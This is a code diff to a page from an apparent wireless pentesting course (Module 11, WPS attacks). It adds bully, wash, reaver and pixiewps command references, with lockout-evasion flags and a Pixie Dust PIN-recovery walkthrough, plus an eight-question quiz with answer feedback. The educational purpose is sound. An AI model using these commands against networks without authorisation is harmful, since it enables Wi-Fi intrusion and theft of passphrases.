@@ -145,6 +145,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -444,6 +465,222 @@
       </div>
     </section>
 
+    <!-- Section 8: bully + full flag tables -->
+    <section id="bully-flags">
+      <h2><span class="section-num">08</span> bully &amp; Full Flag References</h2>
+      <p><code>bully</code> is often more reliable than reaver against stubborn APs. Both tools support Pixie Dust.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">bully — full usage</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-bully')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-bully"><span class="cmt"># bully basic PIN bruteforce</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo bully wlan0mon <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-v</span> <span class="str">3</span></span>
+<span class="cmt"># -b    Target BSSID</span>
+<span class="cmt"># -v 3  Maximum verbosity (1-3)</span>
+
+<span class="cmt"># Full options with rate-limit evasion</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo bully wlan0mon <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-d</span> <span class="flag">-T</span> <span class="str">0.5</span> <span class="flag">-v</span> <span class="str">3</span></span>
+<span class="cmt"># -c N   Channel</span>
+<span class="cmt"># -d     Use small Diffie-Hellman keys (also triggers Pixie Dust attempt)</span>
+<span class="cmt"># -T N   Timeout per attempt in seconds</span>
+<span class="cmt"># -1     Start from PIN 00000000 (sequential mode)</span>
+<span class="cmt"># -S     Use fixed source MAC</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">wash full flags + reaver complete reference</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-full-flags')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-full-flags"><span class="cmt"># wash — full flag reference</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wash <span class="flag">-i</span> wlan0mon <span class="flag">-C</span> <span class="flag">-s</span></span>
+<span class="cmt"># -C     Ignore FCS errors (use on weak signal)</span>
+<span class="cmt"># -s     Scan mode (continuous, don't stop)</span>
+<span class="cmt"># -c N   Lock to channel N</span>
+<span class="cmt"># -v     Verbose (shows WPS device info: model, serial)</span>
+<span class="cmt"># -o f   Write output to CSV file</span>
+<span class="cmt"># -j     JSON output (for scripting)</span>
+
+<span class="cmt"># reaver — key flags you need to know</span>
+<span class="out">-i wlan0mon      ← monitor interface</span>
+<span class="out">-b BSSID         ← target AP</span>
+<span class="out">-c N             ← lock to channel N</span>
+<span class="out">-vv              ← verbose (show each attempt)</span>
+<span class="out">-d N             ← delay N seconds between attempts</span>
+<span class="out">-t N             ← timeout per attempt</span>
+<span class="out">-r N:S           ← after N attempts, sleep S seconds</span>
+<span class="out">-S               ← small DH keys (required by some APs)</span>
+<span class="out">-N               ← no NACKs (for APs that behave oddly)</span>
+<span class="out">-K 1             ← enable Pixie Dust (calls pixiewps internally)</span>
+<span class="out">-f               ← fixed channel (don't hop)</span>
+<span class="out">--no-nacks       ← suppress NACK frames</span>
+<span class="out">-p PIN           ← start with specific PIN (for resume)</span></div>
+      </div>
+    </section>
+
+    <!-- Section 9: pixiewps standalone + WPS default PINs -->
+    <section id="advanced">
+      <h2><span class="section-num">09</span> Advanced: pixiewps Standalone &amp; Default PINs</h2>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">pixiewps standalone — manual parameter extraction</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-pixiewps')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-pixiewps"><span class="cmt"># Step 1: Capture WPS exchange verbosely with reaver</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo reaver <span class="flag">-i</span> wlan0mon <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-vv</span> <span class="flag">-S</span> 2>&1 | tee wps_capture.txt</span>
+<span class="cmt"># Extract these values from verbose output:</span>
+<span class="cmt"># PKE    = Enrollee public key</span>
+<span class="cmt"># PKR    = Registrar public key</span>
+<span class="cmt"># E-Hash1, E-Hash2, E-Nonce, R-Nonce, AuthKey</span>
+
+<span class="cmt"># Step 2: Run pixiewps with extracted values</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo pixiewps <span class="flag">-e</span> &lt;PKE&gt; <span class="flag">-r</span> &lt;PKR&gt; <span class="flag">-s</span> &lt;E-Hash1&gt; <span class="flag">-z</span> &lt;E-Hash2&gt; <span class="flag">-a</span> &lt;AuthKey&gt; <span class="flag">-n</span> &lt;E-Nonce&gt;</span>
+<span class="cmt"># -e = Enrollee public key (PKE)</span>
+<span class="cmt"># -r = Registrar public key (PKR)</span>
+<span class="cmt"># -s = E-Hash1</span>
+<span class="cmt"># -z = E-Hash2</span>
+<span class="cmt"># -a = AuthKey</span>
+<span class="cmt"># -n = Enrollee nonce (E-Nonce)</span>
+<span class="out-ok">[+] WPS pin found: 12345678</span>
+<span class="out-ok">[*] Time taken: 0 s 123 ms</span>
+
+<span class="cmt"># Default PIN databases — try before brute-forcing</span>
+<span class="cmt"># Some vendors use MAC-based predictable PINs:</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo reaver <span class="flag">-i</span> wlan0mon <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-p</span> <span class="str">12345670</span></span>
+<span class="cmt"># -p PIN  → try a specific PIN first (e.g., known default or MAC-derived)</span>
+<span class="cmt"># Tools for default PIN generation: WPSpin, RouterKeygen</span></div>
+      </div>
+
+      <div class="callout info">
+        <span class="ci">&#128161;</span>
+        <div><strong>WPS Default PIN Databases:</strong> Tools like <code>WPSpin</code> and <code>RouterKeygen</code> derive predictable WPS PINs from the AP's MAC address using vendor-specific algorithms. Trying the derived PIN first (before brute-forcing) can crack some APs in a single attempt. Check the vendor in <code>wash -v</code> output then look up known algorithms.</div>
+      </div>
+    </section>
+
+    <!-- Section 10: Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">10</span> Knowledge Check</h2>
+
+      <div class="quiz-container">
+        <h3>&#127358; Module 11 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">The WPS PIN has 8 digits but only 11,000 guesses are needed. Why?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)">The PIN uses base-7 encoding, reducing the total values</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)">The AP validates the PIN in two halves independently — half 1 (4 digits = 10,000 values) then half 2 (3 digits + 1 checksum = 1,000 values). A NACK at M4 reveals half 1 is wrong, allowing sequential guessing: 10,000 + 1,000 = 11,000 total</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">The WPS standard mandates only 11,000 unique PIN values</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">The last 4 digits are always the same checksum derived from the first 4</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">At which WPS message does the AP indicate that PIN half 1 is incorrect?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">M2 — the registrar public key exchange</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)">M4 NACK — the AP sends a NACK (negative acknowledgment) in place of M4 if E-Hash1 (which encodes half 1) does not validate</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">M6 NACK — half 1 is validated in M6 and half 2 in M4</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">M8 — the AP withholds the WPA2 PSK if any half is wrong</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text">What does the <code>Lck: Yes</code> column in <code>wash</code> output indicate and what is the best attack choice in this situation?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">The router is locked with a complex password — use WPA2 cracking instead</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">WPS lockout is active — the AP is blocking further PIN attempts. Best choice: use Pixie Dust (reaver -K 1) which only needs 1 exchange and never triggers the lockout counter</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">The router requires WPS 2.0 protocol — upgrade reaver to handle it</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">The router is using Ethernet-only WPS — Wi-Fi WPS is disabled</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">What cryptographic weakness in router firmware makes Pixie Dust possible?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)">The AP uses RC4 for WPS encryption, which has a known keystream weakness</button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">A weak or predictable PRNG (Pseudo-Random Number Generator) causes the secret enrollee nonces (E-S1 and E-S2) to be zero, reused, or seeded from a predictable source — allowing offline PIN recovery from a single exchange</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">The AP transmits the WPS PIN in plaintext in the M8 message before authentication</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">WPS uses MD5 for hashing which has known collision vulnerabilities</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">Write the complete reaver command for a Pixie Dust attack against BSSID AA:BB:CC:DD:EE:FF on channel 6 with verbose output.</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)"><code>sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -d</code></button>
+            <button class="option-btn" onclick="answer(this,'q5',true)"><code>sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -K 1</code></button>
+            <button class="option-btn" onclick="answer(this,'q5',false)"><code>sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6</code></button>
+            <button class="option-btn" onclick="answer(this,'q5',false)"><code>sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -K 1</code></button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">What WPA2 credential does M8 deliver upon successful WPS PIN validation?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">The PMK (Pairwise Master Key) derived from PBKDF2</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">The 4-way handshake nonces (ANonce and SNonce)</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">The actual WPA2 passphrase (PSK) in encrypted form — once decrypted using the session keys derived from the PIN, the attacker has the human-readable Wi-Fi password</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">The GTK (Group Temporal Key) for broadcast traffic decryption</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">The <code>reaver -r 3:60</code> flag combination is used for what purpose?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">Retry 3 times then rotate to channel 60</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">After every 3 PIN attempts, sleep for 60 seconds — evading AP rate-limiting and lockout mechanisms by spreading attempts over time</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">Use 3-second timeouts and retry up to 60 times per PIN</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">Send 3 deauth frames then wait 60 seconds before continuing</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">After disabling WPS in the router admin interface, how do you verify it is <em>truly</em> disabled?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)">Check the router's LED indicators — WPS LED off means WPS is disabled</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">Run <code>aircrack-ng</code> and confirm no WPS handshake appears in the capture</button>
+            <button class="option-btn" onclick="answer(this,'q8',true)">Run <code>sudo wash -i wlan0mon</code> and confirm the target AP no longer appears — some routers claim to disable WPS but still respond to WPS probes in the beacon</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">Attempt a normal WPA2 connection — if it works, WPS is disabled</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <div class="nav-footer">
       <a href="../module-10-captive-portal/" class="nav-btn prev">&#8592; Module 10: Captive Portal</a>
       <a href="../module-12-pmkid-attack/" class="nav-btn next">Module 12: PMKID Attack &#8594;</a>
@@ -452,6 +689,78 @@
 </div>
 
 <script>
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. The split-half validation is the core WPS design flaw. The AP validates D1-D4 first. If wrong, it sends NACK at M4 — revealing half 1 is incorrect and allowing the attacker to try the next 4-digit value. Once half 1 is confirmed, only D5-D7 need brute-forcing (1,000 values). D8 is a checksum derivable from D1-D7. Total: 10,000 + 1,000 = 11,000 guesses.",
+      wrong: "Incorrect. The split-half validation is the key. The AP validates the first 4 digits (10,000 possibilities) separately from the next 3 digits (1,000 possibilities). D8 is a checksum. A NACK at M4 tells the attacker the first half is wrong — so they test both halves independently: 10,000 + 1,000 = 11,000 total."
+    },
+    q2: {
+      correct: "Correct. M3 carries E-Hash1 which encodes the first PIN half. The AP validates it and responds with M4 (if correct) or a NACK (if wrong). The NACK at M4 is the oracle that makes the split-half attack work — it leaks which half 1 value is correct without revealing the full PIN.",
+      wrong: "Incorrect. The first PIN half is encoded in E-Hash1, sent in M3. The AP validates E-Hash1 and responds with M4 (success) or a NACK in place of M4 (failure). Similarly, M6 NACK indicates half 2 failure. Half 2 is only attempted after half 1 is confirmed."
+    },
+    q3: {
+      correct: "Correct. Lck: Yes means the AP's WPS lockout is active — typically triggered after a configurable number of failed PIN attempts (often 3-5). Standard PIN brute-forcing is blocked. Pixie Dust (-K 1) only needs to capture a single WPS exchange (M1-M3) and does all computation offline — it never sends wrong PINs to the AP so it never triggers or is blocked by the lockout.",
+      wrong: "Incorrect. Lck: Yes means WPS is locked after too many failed PIN attempts. The AP blocks further PIN guesses. Pixie Dust works here because it only sends one WPS exchange to capture the nonces (E-Nonce, R-Nonce) then solves the PIN entirely offline — never triggering the lockout counter."
+    },
+    q4: {
+      correct: "Correct. The WPS protocol requires the enrollee (AP) to generate random secret nonces E-S1 and E-S2 used in computing E-Hash1 and E-Hash2. On vulnerable firmware, these 'random' nonces are actually E-S1=E-S2=0x00...00 (Ralink), or derived from system uptime (Broadcom), or seeded predictably (Realtek). With known or predictable nonces, pixiewps can recover the PIN offline from a single captured exchange.",
+      wrong: "Incorrect. Pixie Dust exploits weak PRNG (Pseudo-Random Number Generator) in the AP firmware. The WPS enrollee nonces (E-S1, E-S2) should be random secrets. On vulnerable chips (Ralink: zeros, Broadcom: timestamp-based, Realtek: predictable seed), they're not truly random — allowing pixiewps to derive the correct PIN offline."
+    },
+    q5: {
+      correct: "Correct. -K 1 is the reaver flag for Pixie Dust mode. It captures the WPS exchange (M1-M3), extracts the nonces and hash values, then automatically invokes pixiewps to recover the PIN offline. The -c 6 locks to channel 6, -vv provides verbose output.",
+      wrong: "Incorrect. The correct command is: sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -K 1. The -K 1 flag enables Pixie Dust mode in reaver. pixiewps is a standalone tool and doesn't take -i/-b flags directly. bully uses -d instead of -K for Pixie Dust."
+    },
+    q6: {
+      correct: "Correct. M8 is the final WPS message and contains the WPA2 credentials (PSK/passphrase) encrypted with the session keys that were derived from the confirmed PIN. Once the attacker has the PIN (via brute-force or Pixie Dust), the WPA2 passphrase is decrypted from M8 — giving them the actual human-readable Wi-Fi password to authenticate normally.",
+      wrong: "Incorrect. M8 delivers the WPA2 passphrase (PSK) encrypted with session keys derived from the successfully validated PIN. This is why WPS attacks are more powerful than handshake capture — you get the actual password, not just a hash to crack. With the passphrase, you can connect to the network directly."
+    },
+    q7: {
+      correct: "Correct. -r 3:60 tells reaver: 'after every 3 PIN attempts, sleep for 60 seconds'. This evades AP rate-limiting and WPS lockout by spacing out attempts. Many APs have a short lockout that resets after 60 seconds or a few minutes. Combined with -d (delay between attempts), this allows slow but continuous progress.",
+      wrong: "Incorrect. -r 3:60 means: after 3 attempts, rest for 60 seconds. This rate-limits the attack to avoid triggering WPS lockout. Many APs lock after 3-5 failed attempts but reset the counter after a waiting period — this flag exploits that reset window."
+    },
+    q8: {
+      correct: "Correct. Some routers have a known bug where the admin interface shows WPS as 'disabled' but the firmware still includes WPS IE in beacons and still responds to WPS exchanges. The definitive verification is to run wash -i wlan0mon and confirm the target no longer appears in the output — if it does, WPS is still active regardless of what the UI shows.",
+      wrong: "Incorrect. The correct verification is running 'sudo wash -i wlan0mon' and confirming the AP no longer appears. Some routers lie about WPS being disabled — they still respond to WPS probes. wash scans for actual WPS Information Elements in beacon frames, not router UI settings."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 12!' : pct >= 0.75 ? 'Strong — review missed questions.' : pct >= 0.5 ? 'Getting there — re-read the PIN flaw and Pixie Dust sections.' : 'Re-read the M1-M8 flow, split-half math, and Pixie Dust sections.';
+      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
+      scoreEl.classList.add('show');
+    }
+  }
+
   function copyTerm(btn, id) {
     const el = document.getElementById(id);
     navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
